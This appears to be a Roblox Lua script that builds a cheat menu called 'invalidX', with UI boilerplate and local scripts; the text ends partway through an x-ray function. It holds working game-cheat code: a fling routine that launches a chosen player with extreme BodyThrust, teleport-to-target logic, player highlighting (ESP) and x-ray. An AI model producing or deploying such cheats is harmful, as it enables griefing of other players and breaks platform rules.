TextLabel_7.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_7.BackgroundTransparency = 1.000
TextLabel_7.BorderColor3 = Color3.fromRGB(27, 42, 53)
TextLabel_7.Position = UDim2.new(0.147020578, 0, 0.0697803274, 1)
TextLabel_7.Size = UDim2.new(0, 119, 0, 25)
TextLabel_7.Font = Enum.Font.Gotham
TextLabel_7.Text = "Welcome to the "
TextLabel_7.TextColor3 = Color3.fromRGB(200, 200, 200)
TextLabel_7.TextScaled = true
TextLabel_7.TextSize = 15.000
TextLabel_7.TextWrapped = true
TextLabel_7.TextXAlignment = Enum.TextXAlignment.Left

TextLabel_8.Parent = Container
TextLabel_8.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_8.BackgroundTransparency = 1.000
TextLabel_8.BorderColor3 = Color3.fromRGB(27, 42, 53)
TextLabel_8.Position = UDim2.new(0.351487935, 0, 0.0697803274, 1)
TextLabel_8.Size = UDim2.new(0, 67, 0, 25)
TextLabel_8.Font = Enum.Font.Gotham
TextLabel_8.Text = " invalidX."
TextLabel_8.TextColor3 = Color3.fromRGB(200, 200, 200)
TextLabel_8.TextScaled = true
TextLabel_8.TextSize = 15.000
TextLabel_8.TextWrapped = true
TextLabel_8.TextXAlignment = Enum.TextXAlignment.Left

Container2.Name = "Container2"
Container2.Parent = Frame
Container2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Container2.BackgroundTransparency = 1.000
Container2.BorderColor3 = Color3.fromRGB(27, 42, 53)
Container2.Position = UDim2.new(0.0117449667, 0, 0.14161849, 0)
Container2.Size = UDim2.new(0, 582, 0, 283)
Container2.Visible = false

quickbuttons_2.Name = "quick buttons"
quickbuttons_2.Parent = Container2
quickbuttons_2.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
quickbuttons_2.BorderColor3 = Color3.fromRGB(27, 42, 53)
quickbuttons_2.Position = UDim2.new(0.0201855432, -2, 0.00151940878, 0)
quickbuttons_2.Size = UDim2.new(0, 512, 0, 288)

UICorner_24.CornerRadius = UDim.new(0, 4)
UICorner_24.Parent = quickbuttons_2

Frame_8.Parent = quickbuttons_2
Frame_8.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Frame_8.BorderColor3 = Color3.fromRGB(27, 42, 53)
Frame_8.Position = UDim2.new(0, 1, 0, 1)
Frame_8.Size = UDim2.new(0, 511, 0, 287)

UICorner_25.CornerRadius = UDim.new(0, 4)
UICorner_25.Parent = Frame_8

Frame_9.Parent = Frame_8
Frame_9.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame_9.BackgroundTransparency = 1.000
Frame_9.BorderColor3 = Color3.fromRGB(27, 42, 53)
Frame_9.Position = UDim2.new(0.0137255043, 0, 0.125435546, 0)
Frame_9.Size = UDim2.new(0, 503, 0, 242)

UIListLayout_3.Parent = Frame_9
UIListLayout_3.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout_3.Padding = UDim.new(0, 10)

zombieanim.Name = "zombie anim"
zombieanim.Parent = Frame_9
zombieanim.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
zombieanim.BorderColor3 = Color3.fromRGB(27, 42, 53)
zombieanim.Position = UDim2.new(6.06711268e-08, 0, 0, 0)
zombieanim.Size = UDim2.new(0, 503, 0, 23)
zombieanim.AutoButtonColor = false
zombieanim.Font = Enum.Font.Gotham
zombieanim.Text = "ZOMBIE ANIM"
zombieanim.TextColor3 = Color3.fromRGB(209, 209, 209)
zombieanim.TextSize = 14.000
zombieanim.TextXAlignment = Enum.TextXAlignment.Left

UICorner_26.CornerRadius = UDim.new(0, 3)
UICorner_26.Parent = zombieanim

UIGradient_16.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(220, 220, 220))}
UIGradient_16.Rotation = 90
UIGradient_16.Parent = zombieanim

bubblyanim.Name = "bubbly anim"
bubblyanim.Parent = Frame_9
bubblyanim.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
bubblyanim.BorderColor3 = Color3.fromRGB(27, 42, 53)
bubblyanim.Position = UDim2.new(2.07692337, 0, 1.173913, 0)
bubblyanim.Size = UDim2.new(0, 503, 0, 23)
bubblyanim.AutoButtonColor = false
bubblyanim.Font = Enum.Font.Gotham
bubblyanim.Text = "BUBBLY ANIM"
bubblyanim.TextColor3 = Color3.fromRGB(209, 209, 209)
bubblyanim.TextSize = 14.000
bubblyanim.TextXAlignment = Enum.TextXAlignment.Left

UICorner_27.CornerRadius = UDim.new(0, 3)
UICorner_27.Parent = bubblyanim

UIGradient_17.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(220, 220, 220))}
UIGradient_17.Rotation = 90
UIGradient_17.Parent = bubblyanim

cartoonanim.Name = "cartoon anim"
cartoonanim.Parent = Frame_9
cartoonanim.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
cartoonanim.BorderColor3 = Color3.fromRGB(27, 42, 53)
cartoonanim.Position = UDim2.new(2.07692337, 0, -0.304347813, 0)
cartoonanim.Size = UDim2.new(0, 503, 0, 23)
cartoonanim.AutoButtonColor = false
cartoonanim.Font = Enum.Font.Gotham
cartoonanim.Text = "CARTOON ANIM"
cartoonanim.TextColor3 = Color3.fromRGB(209, 209, 209)
cartoonanim.TextSize = 14.000
cartoonanim.TextXAlignment = Enum.TextXAlignment.Left

UICorner_28.CornerRadius = UDim.new(0, 3)
UICorner_28.Parent = cartoonanim

UIGradient_18.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(220, 220, 220))}
UIGradient_18.Rotation = 90
UIGradient_18.Parent = cartoonanim

TextLabel_9.Parent = Frame_8
TextLabel_9.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_9.BackgroundTransparency = 1.000
TextLabel_9.BorderColor3 = Color3.fromRGB(27, 42, 53)
TextLabel_9.Position = UDim2.new(0.0140000004, 3, 0.0439999998, 3)
TextLabel_9.Size = UDim2.new(0, 160, 0, 13)
TextLabel_9.Font = Enum.Font.GothamMedium
TextLabel_9.Text = "FE Fake Animations"
TextLabel_9.TextColor3 = Color3.fromRGB(200, 200, 200)
TextLabel_9.TextScaled = true
TextLabel_9.TextSize = 15.000
TextLabel_9.TextWrapped = true
TextLabel_9.TextXAlignment = Enum.TextXAlignment.Left

Container4.Name = "Container4"
Container4.Parent = Frame
Container4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Container4.BackgroundTransparency = 1.000
Container4.BorderColor3 = Color3.fromRGB(27, 42, 53)
Container4.Position = UDim2.new(0.0117449667, 0, 0.14161849, 0)
Container4.Size = UDim2.new(0, 582, 0, 283)
Container4.Visible = false

quickbuttons_3.Name = "quick buttons"
quickbuttons_3.Parent = Container4
quickbuttons_3.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
quickbuttons_3.BorderColor3 = Color3.fromRGB(27, 42, 53)
quickbuttons_3.Position = UDim2.new(0.0201855432, -2, 0.00151940878, 0)
quickbuttons_3.Size = UDim2.new(0, 512, 0, 288)

UICorner_29.CornerRadius = UDim.new(0, 4)
UICorner_29.Parent = quickbuttons_3

Frame_10.Parent = quickbuttons_3
Frame_10.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Frame_10.BorderColor3 = Color3.fromRGB(27, 42, 53)
Frame_10.Position = UDim2.new(0, 1, 0, 1)
Frame_10.Size = UDim2.new(0, 511, 0, 287)

UICorner_30.CornerRadius = UDim.new(0, 4)
UICorner_30.Parent = Frame_10

Frame_11.Parent = Frame_10
Frame_11.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame_11.BackgroundTransparency = 1.000
Frame_11.BorderColor3 = Color3.fromRGB(27, 42, 53)
Frame_11.Position = UDim2.new(0.0137255043, 0, 0.125435546, 0)
Frame_11.Size = UDim2.new(0, 503, 0, 242)

UIListLayout_4.Parent = Frame_11
UIListLayout_4.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout_4.Padding = UDim.new(0, 10)

TextLabel_10.Parent = Frame_10
TextLabel_10.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_10.BackgroundTransparency = 1.000
TextLabel_10.BorderColor3 = Color3.fromRGB(27, 42, 53)
TextLabel_10.Position = UDim2.new(0.0140000004, 3, 0.0439999998, 3)
TextLabel_10.Size = UDim2.new(0, 160, 0, 13)
TextLabel_10.Font = Enum.Font.GothamMedium
TextLabel_10.Text = "ESP/TRACK"
TextLabel_10.TextColor3 = Color3.fromRGB(200, 200, 200)
TextLabel_10.TextScaled = true
TextLabel_10.TextSize = 15.000
TextLabel_10.TextWrapped = true
TextLabel_10.TextXAlignment = Enum.TextXAlignment.Left

Container5.Name = "Container5"
Container5.Parent = Frame
Container5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Container5.BackgroundTransparency = 1.000
Container5.BorderColor3 = Color3.fromRGB(27, 42, 53)
Container5.Position = UDim2.new(0.0117449667, 0, 0.14161849, 0)
Container5.Size = UDim2.new(0, 582, 0, 283)
Container5.Visible = false

Container3.Name = "Container3"
Container3.Parent = Frame
Container3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Container3.BackgroundTransparency = 1.000
Container3.BorderColor3 = Color3.fromRGB(27, 42, 53)
Container3.Position = UDim2.new(0.0117449667, 0, 0.14161849, 0)
Container3.Size = UDim2.new(0, 582, 0, 283)
Container3.Visible = false

UICorner_31.CornerRadius = UDim.new(0, 4)
UICorner_31.Parent = Container3

quickbuttons_4.Name = "quick buttons"
quickbuttons_4.Parent = Container3
quickbuttons_4.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
quickbuttons_4.BorderColor3 = Color3.fromRGB(27, 42, 53)
quickbuttons_4.Position = UDim2.new(0.0201855432, -2, 0.00151940878, 0)
quickbuttons_4.Size = UDim2.new(0, 512, 0, 288)

UICorner_32.CornerRadius = UDim.new(0, 4)
UICorner_32.Parent = quickbuttons_4

Frame_12.Parent = quickbuttons_4
Frame_12.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Frame_12.BorderColor3 = Color3.fromRGB(27, 42, 53)
Frame_12.Position = UDim2.new(0, 1, 0, 1)
Frame_12.Size = UDim2.new(0, 511, 0, 287)

UICorner_33.CornerRadius = UDim.new(0, 4)
UICorner_33.Parent = Frame_12

Frame_13.Parent = Frame_12
Frame_13.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame_13.BackgroundTransparency = 1.000
Frame_13.BorderColor3 = Color3.fromRGB(27, 42, 53)
Frame_13.Position = UDim2.new(0.0137255043, 0, 0.125435546, 0)
Frame_13.Size = UDim2.new(0, 503, 0, 242)

UIListLayout_5.Parent = Frame_13
UIListLayout_5.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout_5.Padding = UDim.new(0, 10)

summonfriends.Name = "summonfriends"
summonfriends.Parent = Frame_13
summonfriends.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
summonfriends.BorderColor3 = Color3.fromRGB(27, 42, 53)
summonfriends.Position = UDim2.new(2.07692337, 0, 1.173913, 0)
summonfriends.Size = UDim2.new(0, 503, 0, 23)
summonfriends.AutoButtonColor = false
summonfriends.Font = Enum.Font.Gotham
summonfriends.Text = " !summon (FRIENDS ONLY!1)"
summonfriends.TextColor3 = Color3.fromRGB(209, 209, 209)
summonfriends.TextSize = 14.000
summonfriends.TextXAlignment = Enum.TextXAlignment.Left

UICorner_34.CornerRadius = UDim.new(0, 3)
UICorner_34.Parent = summonfriends

UIGradient_19.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(220, 220, 220))}
UIGradient_19.Rotation = 90
UIGradient_19.Parent = summonfriends

jork.Name = "jork"
jork.Parent = Frame_13
jork.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
jork.BorderColor3 = Color3.fromRGB(27, 42, 53)
jork.Position = UDim2.new(2.07692337, 0, 1.173913, 0)
jork.Size = UDim2.new(0, 503, 0, 23)
jork.AutoButtonColor = false
jork.Font = Enum.Font.Gotham
jork.Text = " JORK IT"
jork.TextColor3 = Color3.fromRGB(209, 209, 209)
jork.TextSize = 14.000
jork.TextXAlignment = Enum.TextXAlignment.Left

UICorner_35.CornerRadius = UDim.new(0, 3)
UICorner_35.Parent = jork

UIGradient_20.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(220, 220, 220))}
UIGradient_20.Rotation = 90
UIGradient_20.Parent = jork

blackhole.Name = "blackhole"
blackhole.Parent = Frame_13
blackhole.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
blackhole.BorderColor3 = Color3.fromRGB(27, 42, 53)
blackhole.Position = UDim2.new(2.07692337, 0, 1.173913, 0)
blackhole.Size = UDim2.new(0, 503, 0, 23)
blackhole.AutoButtonColor = false
blackhole.Font = Enum.Font.Gotham
blackhole.Text = "BLACKHOLE"
blackhole.TextColor3 = Color3.fromRGB(209, 209, 209)
blackhole.TextSize = 14.000
blackhole.TextXAlignment = Enum.TextXAlignment.Left

UIGradient_21.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(220, 220, 220))}
UIGradient_21.Rotation = 90
UIGradient_21.Parent = blackhole

UICorner_36.CornerRadius = UDim.new(0, 3)
UICorner_36.Parent = blackhole

TextLabel_11.Parent = Frame_12
TextLabel_11.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_11.BackgroundTransparency = 1.000
TextLabel_11.BorderColor3 = Color3.fromRGB(27, 42, 53)
TextLabel_11.Position = UDim2.new(0.0140000004, 3, 0.0439999998, 3)
TextLabel_11.Size = UDim2.new(0, 160, 0, 13)
TextLabel_11.Font = Enum.Font.GothamMedium
TextLabel_11.Text = "RANDOM BUTTONS"
TextLabel_11.TextColor3 = Color3.fromRGB(200, 200, 200)
TextLabel_11.TextScaled = true
TextLabel_11.TextSize = 15.000
TextLabel_11.TextWrapped = true
TextLabel_11.TextXAlignment = Enum.TextXAlignment.Left

ImageButton.Parent = MAIN
ImageButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton.BackgroundTransparency = 1.000
ImageButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageButton.BorderSizePixel = 0
ImageButton.Position = UDim2.new(0.964999974, 0, 0.0260000005, 0)
ImageButton.Size = UDim2.new(0.023, 0, 0.0670000017, 0)
ImageButton.Image = "rbxassetid://7743878857"

UIAspectRatioConstraint.Parent = ImageButton

ImageButton_2.Parent = MAIN
ImageButton_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton_2.BackgroundTransparency = 1.000
ImageButton_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageButton_2.BorderSizePixel = 0
ImageButton_2.Position = UDim2.new(0.931555212, 0, 0.0260000117, 0)
ImageButton_2.Size = UDim2.new(0.023, 0, 0.0670000017, 0)
ImageButton_2.Image = "rbxassetid://133328822613992"

UIAspectRatioConstraint_2.Parent = ImageButton_2

sidebar.Name = "sidebar"
sidebar.Parent = MAIN
sidebar.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
sidebar.BorderColor3 = Color3.fromRGB(27, 42, 53)
sidebar.Position = UDim2.new(0.90763402, -2, 0.147678152, 0)
sidebar.Size = UDim2.new(0, 50, 0, 289)

UICorner_37.CornerRadius = UDim.new(0, 4)
UICorner_37.Parent = sidebar

Frame_14.Parent = sidebar
Frame_14.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Frame_14.BorderColor3 = Color3.fromRGB(35, 35, 35)
Frame_14.Position = UDim2.new(0.0480004884, -2, 0.000131468463, 0)
Frame_14.Size = UDim2.new(0, 48, 0, 287)

Frame_15.Parent = Frame_14
Frame_15.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame_15.BackgroundTransparency = 1.000
Frame_15.BorderColor3 = Color3.fromRGB(27, 42, 53)
Frame_15.Position = UDim2.new(0.229166672, 0, 0.0418118462, 0)
Frame_15.Size = UDim2.new(0, 25, 0, 267)

UIListLayout_6.Parent = Frame_15
UIListLayout_6.HorizontalAlignment = Enum.HorizontalAlignment.Center
UIListLayout_6.Padding = UDim.new(0, 34)

UICorner_38.CornerRadius = UDim.new(0, 4)
UICorner_38.Parent = Frame_15

xSetting.Name = "xSetting"
xSetting.Parent = Frame_15
xSetting.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
xSetting.BackgroundTransparency = 1.000
xSetting.BorderColor3 = Color3.fromRGB(0, 0, 0)
xSetting.BorderSizePixel = 0
xSetting.Size = UDim2.new(0, 26, 0, 25)
xSetting.Image = "rbxassetid://7059346373"

Spectate.Name = "Spectate"
Spectate.Parent = Frame_15
Spectate.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Spectate.BackgroundTransparency = 1.000
Spectate.BorderColor3 = Color3.fromRGB(0, 0, 0)
Spectate.BorderSizePixel = 0
Spectate.Size = UDim2.new(0, 26, 0, 25)
Spectate.Image = "rbxassetid://6523858394"

Hammer.Name = "Hammer"
Hammer.Parent = Frame_15
Hammer.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Hammer.BackgroundTransparency = 1.000
Hammer.BorderColor3 = Color3.fromRGB(0, 0, 0)
Hammer.BorderSizePixel = 0
Hammer.Size = UDim2.new(0, 26, 0, 25)
Hammer.Image = "rbxassetid://86790733059940"

Emotes.Name = "Emotes"
Emotes.Parent = Frame_15
Emotes.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Emotes.BackgroundTransparency = 1.000
Emotes.BorderColor3 = Color3.fromRGB(0, 0, 0)
Emotes.BorderSizePixel = 0
Emotes.Size = UDim2.new(0, 26, 0, 25)
Emotes.Image = "rbxassetid://11713358131"

AHome.Name = "AHome"
AHome.Parent = Frame_15
AHome.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
AHome.BackgroundTransparency = 1.000
AHome.BorderColor3 = Color3.fromRGB(0, 0, 0)
AHome.BorderSizePixel = 0
AHome.Size = UDim2.new(0, 26, 0, 25)
AHome.Image = "rbxassetid://4034483344"

-- Scripts:

local function UFQWGJ_fake_script() -- ScreenGui.Start 
	local script = Instance.new('LocalScript', ScreenGui)

	local sg = game:GetService("StarterGui")
	local players = game:GetService("Players")
	local player = players.LocalPlayer
	local gui = script.Parent -- the ScreenGui holding MAIN
	local mainFrame = gui:WaitForChild("MAIN")
	
	-- Hide MAIN at start
	mainFrame.Visible = false
	
	-- Function to play a sound (with optional settings)
	local function playSound(soundId, volume, speed)
		local sound = Instance.new("Sound")
		sound.SoundId = "rbxassetid://" .. soundId
		sound.Volume = volume or 0.5
		sound.PlaybackSpeed = speed or 1
		sound.Parent = workspace
		sound:Play()
		game:GetService("Debris"):AddItem(sound, 5) -- auto remove after 5s
	end
	
	-- First notif (Loading...)
	sg:SetCore("SendNotification", {
		Title = "Loading...",
		Text = "Loading data...",
		Duration = 3
	})
	playSound(90782284167817, 0.2, 1.5) -- first sound with custom volume + speed
	
	-- After delay, show welcome + profile picture
	task.delay(3, function()
		local thumbType = Enum.ThumbnailType.HeadShot
		local thumbSize = Enum.ThumbnailSize.Size420x420
		local content, isReady = players:GetUserThumbnailAsync(player.UserId, thumbType, thumbSize)
	
		sg:SetCore("SendNotification", {
			Title = "Welcome " .. player.Name,
			Text = "Your profile loaded!",
			Icon = content,
			Duration = 5
		})
	
		playSound(6432593850) -- second sound normal
	
		-- Show MAIN frame after welcome
		mainFrame.Visible = true
	end)
	
end
coroutine.wrap(UFQWGJ_fake_script)()
local function LFZZ_fake_script() -- ProfilePicture.LocalScript 
	local script = Instance.new('LocalScript', ProfilePicture)

	local Players = game:GetService("Players")
	local player = Players.LocalPlayer
	local imageLabel = script.Parent
	
	local userId = player.UserId
	local content, isReady = Players:GetUserThumbnailAsync(
		userId,
		Enum.ThumbnailType.HeadShot,
		Enum.ThumbnailSize.Size100x100
	)
	
	imageLabel.Image = content
	
end
coroutine.wrap(LFZZ_fake_script)()
local function YTJHUSU_fake_script() -- ServerPlayersLabel.LocalScript 
	local script = Instance.new('LocalScript', ServerPlayersLabel)

	local Players = game:GetService("Players")
	local label = script.Parent
	
	local function update()
		label.Text = "Players: " .. tostring(#Players:GetPlayers())
	end
	
	Players.PlayerAdded:Connect(update)
	Players.PlayerRemoving:Connect(update)
	update()
	
end
coroutine.wrap(YTJHUSU_fake_script)()
local function GPBJMB_fake_script() -- ServerUptimeLabel.LocalScript 
	local script = Instance.new('LocalScript', ServerUptimeLabel)

	local RunService = game:GetService("RunService")
	local label = script.Parent
	local startTime = os.time()
	
	RunService.RenderStepped:Connect(function()
		local elapsed = os.time() - startTime
		local minutes = math.floor(elapsed / 60)
		local seconds = elapsed % 60
		label.Text = string.format("Uptime: %02d:%02d", minutes, seconds)
	end)
	
end
coroutine.wrap(GPBJMB_fake_script)()
local function LXFMLAO_fake_script() -- TextLabel_3.LocalScript 
	local script = Instance.new('LocalScript', TextLabel_3)

	local textLabel = script.Parent -- put this LocalScript inside the TextLabel
	
	-- lighter soft colours
	local colors = {
		Color3.fromRGB(120, 50, 120),
		Color3.fromRGB(50, 120, 120),
		Color3.fromRGB(120, 120, 50),
		Color3.fromRGB(80, 80, 80),
		Color3.fromRGB(100, 40, 90),
		Color3.fromRGB(40, 100, 60),
		Color3.fromRGB(70, 90, 40),
		Color3.fromRGB(90, 70, 90),
		Color3.fromRGB(110, 60, 110)
	}
	
	local function lerpColor(a, b, t)
		return a:Lerp(b, t)
	end
	
	while true do
		for i = 1, #colors do
			local nextIndex = i % #colors + 1
			for t = 0, 1, 0.02 do -- smooth fade speed
				textLabel.TextColor3 = lerpColor(colors[i], colors[nextIndex], t)
				wait(0.03)
			end
		end
	end
	
end
coroutine.wrap(LXFMLAO_fake_script)()
local function WIMQ_fake_script() -- tpknocked.LocalScript 
	local script = Instance.new('LocalScript', tpknocked)

	-- LocalScript inside the TextBox
	local TextBox = script.Parent
	local Players = game:GetService("Players")
	local LocalPlayer = Players.LocalPlayer
	local RunService = game:GetService("RunService")
	local UserInputService = game:GetService("UserInputService")
	local StarterGui = game:GetService("StarterGui")
	
	local savedPos = nil
	local armed = false
	local teleported = false
	local connection = nil
	local healthConnection = nil
	local currentTarget = nil
	
	-- helper: notify
	local function notify(msg)
		pcall(function()
			StarterGui:SetCore("SendNotification", {
				Title = "Notification",
				Text = msg,
				Duration = 3
			})
		end)
	end
	
	-- find closest matching player
	local function findClosestPlayer(input)
		input = string.lower(input)
		local bestMatch = nil
		local bestScore = math.huge
	
		for _, player in ipairs(Players:GetPlayers()) do
			local possibleNames = {
				string.lower(player.Name),
				string.lower(player.DisplayName),
				tostring(player.UserId)
			}
	
			for _, name in ipairs(possibleNames) do
				local pos = string.find(name, input, 1, true)
				if pos then
					local score = pos + math.abs(#name - #input)
					if score < bestScore then
						bestScore = score
						bestMatch = player
					end
				end
			end
		end
	
		return bestMatch
	end
	
	-- teleport back + reset
	local function teleportBack()
		if savedPos and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
			LocalPlayer.Character.HumanoidRootPart.CFrame = savedPos
		end
		if connection then connection:Disconnect() end
		notify("TELEPORTED BACK")
		armed = false
		teleported = false
		savedPos = nil
		connection = nil
	end
	
	-- watch target health
	local function watchTarget(target)
		if healthConnection then healthConnection:Disconnect() end
		if not target.Character or not target.Character:FindFirstChild("Humanoid") then return end
		local humanoid = target.Character.Humanoid
	
		healthConnection = humanoid:GetPropertyChangedSignal("Health"):Connect(function()
			if humanoid.Health <= 1 and not teleported then
				task.wait(1) -- wait 1 second before teleport
	
				if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
					savedPos = LocalPlayer.Character.HumanoidRootPart.CFrame
					notify("TELEPORTING")
	
					LocalPlayer.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame + Vector3.new(0, 5, 0)
					teleported = true
	
					-- press G to arm the return
					UserInputService.InputBegan:Connect(function(input, gp)
						if gp then return end
						if input.KeyCode == Enum.KeyCode.G and teleported and not armed then
							armed = true
							local humanoidLocal = LocalPlayer.Character:FindFirstChild("Humanoid")
							if humanoidLocal then
								connection = RunService.Heartbeat:Connect(function()
									if humanoidLocal.MoveDirection.Magnitude > 0 then
										teleportBack()
									end
								end)
							end
						end
					end)
				end
			end
		end)
	end
	
	-- when enter pressed in textbox
	TextBox.FocusLost:Connect(function(enterPressed)
		if enterPressed then
			local input = TextBox.Text
			if input == "" then return end
	
			local target = findClosestPlayer(input)
			if target then
				if currentTarget and currentTarget ~= target then
					notify("Target changed: " .. target.Name)
				else
					notify("Target set: " .. target.Name)
				end
				currentTarget = target
				watchTarget(target)
			end
		end
	end)
	
end
coroutine.wrap(WIMQ_fake_script)()
local function GNANJXO_fake_script() -- Fling.LocalScript 
	local script = Instance.new('LocalScript', Fling)

	-- LocalScript inside the TextBox
	local TextBox = script.Parent
	local Players = game:GetService("Players")
	local LocalPlayer = Players.LocalPlayer
	local RunService = game:GetService("RunService")
	
	-- find closest matching player
	local function findClosestPlayer(input)
		input = string.lower(input)
		local bestMatch = nil
		local bestScore = math.huge
	
		for _, player in ipairs(Players:GetPlayers()) do
			local possibleNames = {
				string.lower(player.Name),
				string.lower(player.DisplayName),
				tostring(player.UserId)
			}
	
			for _, name in ipairs(possibleNames) do
				local pos = string.find(name, input, 1, true)
				if pos then
					local score = pos + math.abs(#name - #input)
					if score < bestScore then
						bestScore = score
						bestMatch = player
					end
				end
			end
		end
	
		return bestMatch
	end
	
	local function flingTarget(target)
		local char = LocalPlayer.Character
		if not char or not char:FindFirstChild("HumanoidRootPart") then return end
		if not target.Character or not target.Character:FindFirstChild("HumanoidRootPart") then return end
	
		local hrp = char.HumanoidRootPart
		local targetHRP = target.Character.HumanoidRootPart
		local originalCFrame = hrp.CFrame
	
		-- teleport into the target
		hrp.CFrame = targetHRP.CFrame
	
		-- create BodyThrust on the target
		local thrust = Instance.new("BodyThrust")
		thrust.Force = Vector3.new(9999,9999,9999)
		thrust.Location = targetHRP.Position
		thrust.Parent = targetHRP
	
		-- fling loop to follow target
		local connection
		connection = RunService.Heartbeat:Connect(function()
			if not target.Character or not target.Character:FindFirstChild("HumanoidRootPart") then
				connection:Disconnect()
				thrust:Destroy()
				-- teleport back and freeze
				hrp.CFrame = originalCFrame
				hrp.Anchored = true
				task.wait(0.5)
				hrp.Anchored = false
				return
			end
	
			-- keep updating your position inside them
			hrp.CFrame = targetHRP.CFrame
			thrust.Location = targetHRP.Position
		end)
	
		-- separate loop to teleport back once target is flung
		spawn(function()
			while targetHRP and targetHRP.Parent do
				if targetHRP.Velocity.Magnitude > 50 then
					break
				end
				task.wait(0.05)
			end
			-- teleport back and freeze briefly
			if hrp then
				hrp.CFrame = originalCFrame
				hrp.Anchored = true
				task.wait(0.5)
				hrp.Anchored = false
			end
			-- cleanup
			connection:Disconnect()
			thrust:Destroy()
		end)
	end
	
	TextBox.FocusLost:Connect(function(enterPressed)
		if enterPressed then
			local input = TextBox.Text
			if input == "" then return end
	
			local target = findClosestPlayer(input)
			if target then
				flingTarget(target)
			end
		end
	end)
	
end
coroutine.wrap(GNANJXO_fake_script)()
local function ZMKMED_fake_script() -- highlightplayer.LocalScript 
	local script = Instance.new('LocalScript', highlightplayer)

	-- LocalScript inside the TextBox
	local TextBox = script.Parent
	local Players = game:GetService("Players")
	local StarterGui = game:GetService("StarterGui")
	
	local currentTarget = nil
	local currentHighlight = nil
	
	-- helper: notify
	local function notify(msg)
		pcall(function()
			StarterGui:SetCore("SendNotification", {
				Title = "Notification",
				Text = msg,
				Duration = 3
			})
		end)
	end
	
	-- find closest matching player
	local function findClosestPlayer(input)
		input = string.lower(input)
		local bestMatch = nil
		local bestScore = math.huge
	
		for _, player in ipairs(Players:GetPlayers()) do
			local possibleNames = {
				string.lower(player.Name),
				string.lower(player.DisplayName),
				tostring(player.UserId)
			}
	
			for _, name in ipairs(possibleNames) do
				local pos = string.find(name, input, 1, true)
				if pos then
					local score = pos + math.abs(#name - #input)
					if score < bestScore then
						bestScore = score
						bestMatch = player
					end
				end
			end
		end
	
		return bestMatch
	end
	
	-- create a highlight for a player's character
	local function applyHighlight(player)
		if currentHighlight then
			currentHighlight:Destroy()
			currentHighlight = nil
		end
	
		if player.Character then
			local highlight = Instance.new("Highlight")
			highlight.FillTransparency = 1
			highlight.OutlineColor = Color3.fromRGB(255, 0, 0)
			highlight.Adornee = player.Character
			highlight.Parent = player.Character
			currentHighlight = highlight
		end
	end
	
	-- listen for respawn to reapply highlight
	local function trackPlayer(player)
		player.CharacterAdded:Connect(function()
			task.wait(0.5) -- wait a moment for character to load
			if player == currentTarget then
				applyHighlight(player)
			end
		end)
	end
	
	-- handle input from textbox
	TextBox.FocusLost:Connect(function(enterPressed)
		if enterPressed then
			local input = TextBox.Text
			if input == "" then return end
	
			local target = findClosestPlayer(input)
			if target then
				if currentTarget ~= target then
					notify("Target set: " .. target.Name)
				end
				currentTarget = target
				trackPlayer(target)
				applyHighlight(target)
			else
				notify("No player found")
			end
		end
	end)
	
end
coroutine.wrap(ZMKMED_fake_script)()
local function RJUHCF_fake_script() -- xray.LocalScript 
	local script = Instance.new('LocalScript', xray)

	local button = script.Parent
	local originalTransparency = {} -- store original transparency
	local toggled = false
	
